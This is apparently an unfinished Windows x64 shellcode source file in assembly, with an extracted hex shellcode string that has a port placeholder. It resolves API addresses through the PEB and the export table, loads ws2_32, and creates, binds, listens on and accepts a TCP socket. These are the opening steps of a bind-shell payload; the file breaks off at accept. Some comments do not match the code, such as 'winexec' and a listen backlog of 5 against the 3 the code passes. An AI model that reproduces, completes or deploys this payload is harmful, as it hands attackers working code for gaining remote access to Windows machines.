BITS 64
SECTION .text
global main

main:
    xor rbx, rbx
    mov rax, [gs:rbx+0x60]                      ; TEB address 
    mov rax, [rax + 0x18]                ; PEB address 
    mov rsi, [rax + 0x20]                ; PEB_LDR_DATA  
    lodsq                                       ; ntdll.dll 
    xchg rax, rsi
    lodsq                                       ; kernelbase.dll 
    mov rbx, [rax + 0x20]                ; kernel32.dll 

    xor r8, r8 
    mov r8d, [rbx + 0x3c]               ; pe signature rva 
    mov rdx, r8 
    add rdx, rbx                        ; pe header 
    xor rcx, rcx 
    mov cl, 0x88 
    mov r8d, [rdx + rcx]               ; rva export table 
    add r8, rbx 
    mov rdx, r8                         ; export table 

    xor rsi, rsi 
    mov esi, [rdx + 0x20]               ; name table rva 
    add rsi, rbx                        ; name table 
    xor rcx, rcx 
    mov r9, 0x41636f7250746547          ; GetProcA
  get_getprocAddr : 
    inc rcx 
    mov eax, [rsi + rcx * 4]            ; name table contains offset of string name functions 
    add rax, rbx 
    cmp QWORD [rax], r9     
    jnz get_getprocAddr 

    xor rsi, rsi
    mov esi, [rdx + 0x24] 
    add rsi, rbx                        ; rva ordinal table 
    mov cx, [rsi + 2 * rcx]             ; position  
    xor rsi, rsi 
    mov esi, [rdx + 0x1c]               ; rva address table 
    add rsi, rbx                        ; address table 
    xor rdi, rdi 
    mov r14d, [rsi + rcx * 4]            ; rva address of winexec 
    add r14, rbx                        ; address of GetProcAddress 

    ; get LoadLibraryA address by calling GetProcAddress
    ; GetProcAddress(lib_base, function_name) 
    xor rdx, rdx 
    mov edx, 0x41797261 
    push rdx 
    mov rdx, 0x7262694c64616f4c         ; LoadLibraryA 
    push rdx 
    mov rdx, rsp   
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rsi, rax                        ; address of LoadLibraryA functions 

    ; LoadLibraryA('ws2_32.dll') 
    xor rcx, rcx 
    push rcx  
    mov cx, 0x6c6c
    push rcx 
    mov rcx, 0x642e32335f327377 
    push rcx 
    mov rcx, rsp 
    sub rsp, 0x30 
    call rsi  
    add rsp, 0x30 
    mov r15, rax                        ; r15 = hWs2_32 

    ; GetProcAddress(hWs2_32, 'WSAStartup') 
    xor rcx, rcx 
    mov cx, 0x7075
    push rcx 
    mov rcx, 0x7472617453415357 
    push rcx 
    mov rcx, r15 
    mov rdx, rsp 
    sub rsp, 0x30 
    call r14  
    add rsp, 0x30 
    mov r13, rax                        ; r13 = WSAStartup 

    ; WSAStartup(0x202, &WSADATA) 
    xor rcx, rcx 
    mov cx, 0x202 
    sub rsp, 0x30 
    mov rdx, rsp 
    call r13 
    ;add rsp, 0x30 

    ; GetProcAddress(hWs2_32, "socket") 
    mov rcx, 0x74656b636f73aaaa
    shr rcx, 16
    push rcx 
    mov rdx, rsp 
    mov rcx, r15 
    sub rsp, 0x30 
    call r14  
    add rsp, 0x30 
    mov r13, rax                        ; r13 = hSocket 

    ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) 
    push 2 
    pop rcx 
    push 1 
    pop rdx 
    push 6 
    pop r8 
    sub rsp, 0x38  
    call r13 
    add rsp, 0x60 
    mov r12, rax                        ; r12 = socket 

    ; GetProcAddress(hWs2_32, 'bind') 
    xor rcx, rcx 
    mov ecx, 0x646e6962
    push rcx 
    mov rdx, rsp 
    mov rcx, r15 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov r13, rax 

    ; bind(socket, sockaddr, 0x10)
    xor rcx, rcx 
    push rcx 
    inc rcx
    shl rcx, 24 
    add rcx, 0x7f                       ; ecx = 0x100007f 
    shl rcx, 32 
    mov edx, 0x12340102
    dec dh                             ; ecx = 0x12340002
    add rcx, rdx 
    push rcx 
    mov rdx, rsp 
    mov rcx, r12 
    xor r8, r8 
    mov r8b, 0x10 
    sub rsp, 0x30 
    call r13 
    add rsp, 0x30 

    ; GetProcAddress(hWs2_32, 'listen') 
    xor rcx, rcx 
    mov rcx, 0x6e657473696cbbbb
    shr rcx, 16 
    push rcx 
    mov rdx, rsp 
    mov rcx, r15 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov r13, rax 

    ; listen(socket, 5) 
    xor rdx, rdx 
    mov dl, 0x3
    mov rcx, r12 
    sub rsp, 0x30 
    call r13 
    add rsp, 0x30 

    ; GetProcAddress(hWs2_32, 'accept') 
    xor rcx, rcx 
    mov rcx, 0x747065636361bbbb
    shr rcx, 16 
    push rcx 
    mov rdx, rsp 
    mov rcx, r15 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov r13, rax  

    ; acceps(socket, NULL, NULL) 
    xor rdx, rdx 
    xor r8, r8 
    mov rcx, r12 
    call r13 

;4831db65488b4360488b4018488b702048ad489648ad488b58204d31c0448b433c4c89c24801da4831c9b188448b040a4901d84c89c24831f68b72204801de4831c949b947657450726f634148ffc18b048e4801d84c390875f24831f68b72244801de668b0c4e4831f68b721c4801de4831ff448b348e4901de4831d2ba617279415248ba4c6f61644c696272524889e24889d94883ec3041ffd64883c4304889c64831c95166b96c6c5148b97773325f33322e64514889e14883ec30ffd64883c4304989c74831c966b975705148b95753415374617274514c89f94889e24883ec3041ffd64883c4304989c54831c966b902024883ec304889e241ffd548b9aaaa736f636b657448c1e910514889e24c89f94883ec3041ffd64883c4304989c56a02596a015a6a0641584883ec3841ffd54883c4604989c44831c9b962696e64514889e24c89f94883ec3041ffd64883c4304989c54831c95148ffc148c1e1184883c17f48c1e120ba0201{}fece4801d1514889e24c89e14d31c041b0104883ec3041ffd54883c4304831c948b9bbbb6c697374656e48c1e910514889e24c89f94883ec3041ffd64883c4304989c54831d2b2034c89e14883ec3041ffd54883c4304831c948b9bbbb61636365707448c1e910514889e24c89f94883ec3041ffd64883c4304989c54831d24d31c04c89e141ffd5

